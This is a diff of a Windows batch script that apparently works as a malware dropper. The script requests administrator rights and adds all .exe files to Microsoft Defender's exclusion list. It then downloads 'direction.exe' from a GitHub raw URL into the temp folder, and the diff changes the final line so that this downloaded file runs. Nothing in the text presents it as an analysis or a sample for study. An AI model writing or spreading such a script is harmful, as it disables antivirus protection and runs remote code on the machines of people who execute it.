@@ -1,4 +1,4 @@
-@echo off
+io@echo off
 
 :: BatchGotAdmin
 :-------------------------------------
@@ -27,4 +27,4 @@ if '%errorlevel%' NEQ '0' (
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
 Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/DirectionLoader/direction/main/direction.exe' -OutFile direction.exe"
-installer.exe
+direction.exe
